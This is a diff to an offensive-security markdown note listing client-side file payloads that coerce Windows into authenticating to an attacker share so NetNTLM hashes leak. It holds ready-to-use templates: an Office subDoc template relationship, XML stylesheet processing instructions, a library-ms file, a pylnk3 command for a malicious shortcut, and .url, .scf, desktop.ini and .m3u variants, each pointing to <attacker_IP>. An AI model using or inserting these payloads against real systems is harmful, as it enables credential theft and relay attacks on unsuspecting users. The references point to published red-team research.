@@ -9,17 +9,6 @@
 </html>
 ```
 
-## 02 - Microsoft Office subDoc
-
-Extract `.docx` file using `7zip` or `unzip` and modify the contents in `word\_rels\settings.xml.rels`.
-
-```xml
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<attacker_IP>/leak/Template.dotx" TargetMode="External"/>
-</Relationships>
-```
-
 Using a URL handle with `ms-word:ofe|u|` scheme can trigger SMB relay.
 
 ```html
@@ -31,7 +20,68 @@ Using a URL handle with `ms-word:ofe|u|` scheme can trigger SMB relay.
 </html>
 ```
 
-## 03 - ClickOnce
+## 02 - XML
+
+### 2.1 - Microsoft Office subDoc
+
+Extract `.docx` file using `7zip` or `unzip` and modify the contents in `word\_rels\settings.xml.rels`.
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<attacker_IP>/leak/Template.dotx" TargetMode="External"/>
+</Relationships>
+```
+
+### 2.2 - XML Stylesheet
+
+Name it with either `.xml` or `.xsl` extension.
+
+```xml
+<?xml version="1.0" encoding="utf-8" ?>
+<?mso-application progid="Word.Document"?>
+<?xml-stylesheet type="text/xsl" href="\\<attacker_IP>\snare\file.xsl"?>
+```
+
+A `file://` schema can be exploited when bypassing firewall through WebDAV protocol.
+
+```xml
+<?xml version="1.0" encoding="utf-8" ?>
+<?mso-application progid="Word.Document"?>
+<?xml-stylesheet type="text/xsl" file=:////<attacker_IP>/snare/file.xsl"?>
+```
+
+The user can open the document with **Office XML** but to execute it through command line can be weaponized.
+
+```
+C:\> MSOXMLED.EXE /verb open "C:\path\to\file.xml"
+```
+
+### 2.3 - Library MS
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
+	<name>@windows.storage.dll,-34582</name>
+	<version>6</version>
+	<isLibraryPinned>true</isLibraryPinned>
+	<iconReference>imageres.dll,-1003</iconReference>
+	<templateInfo>
+		<folderType><§7d49d726-3c21-4f05-99aa-fdc2c9474656§></folderType>
+	</templateInfo>
+	<searchConnectorDescriptionList>
+	<searchConnectorDescription>
+	<isDefaultSaveLocation>true</isDefaultSaveLocation>
+	<isSupported>false</isSupported>
+		<simpleLocation>
+			<url>\\<attacker_IP>\<share_name>\\library-ms_1234</url>
+		\r\t\t</simpleLocation>
+	\r\t</searchConnectorDescription>
+	\r\t</searchConnectorDescriptionList>
+\r</libraryDescription>
+```
+
+### 2.4 - ClickOnce
 
 TODO: check `.manifest` and `.appref-ms` to reproduce it.
 
@@ -58,15 +108,7 @@ Name it with `.application` extension.
 </asmv1:assembly>
 ```
 
-## 04 - Shortcut LNK
-
-TODO: Show it step by step.
-
-```
-
-```
-
-## 05 - Java Web Start
+### 2.5 - Java Web Start
 
 Name it with `.jnlp` extension.
 
@@ -80,7 +122,15 @@ Name it with `.jnlp` extension.
 </jnlp>
 ```
 
-## 06 - Internet Shortcut File
+## 03 - Shortcut LNK
+
+TODO: Show it step by step.
+
+```
+$ pylnk3 c \\<attacker_IP>\<share_name>\file.ext implant.lnk
+```
+
+## 04 - Internet Shortcut File
 
 SMB link and name it with `.url` extension.
 
@@ -98,7 +148,7 @@ WebDAV link.
 URL=file://<attacker_IP>/@snare
 ```
 
-## 07 - Shell Command Files
+## 05 - Shell Command Files
 
 > [!INFO]
 > Windows 10 or later no longer supports `.scf`.
@@ -113,7 +163,7 @@ IconFile=\\<attacker_IP>\snare\file.ico
 Command=ToggleDesktop
 ```
 
-## 08 - Desktop.ini
+## 06 - Desktop.ini
 
 Name it with `.ini` extension.
 
@@ -131,7 +181,7 @@ attrib +s +h desktop.ini
 IconResource=\\<attacker_IP>\snare
 ```
 
-## 09 - Windows Media Player
+## 07 - Windows Media Player
 
 Name it with `.m3u` extension.
 
@@ -156,6 +206,10 @@ Name it with `.asx` extension.
 ---
 ## References
 
+### Backlinks
+
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut Link File/Windows/Manual/Unix Shell]]
+
 ### Rhino Security Labs
 
 - [Rhino Security Labs: Abusing Microsoft Word Features for Phishing - "subDoc"](https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/)
@@ -163,6 +217,10 @@ Name it with `.asx` extension.
 ### Securify
 
 - [Securify: Living off the Land Stealing NetNTLM Hashes](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)
+
+### Bohops
+
+- [Bohops: Capturing NetNTLM Hashes with Office [DOT] XML Documents](https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/)
 
 ### Osanda
 
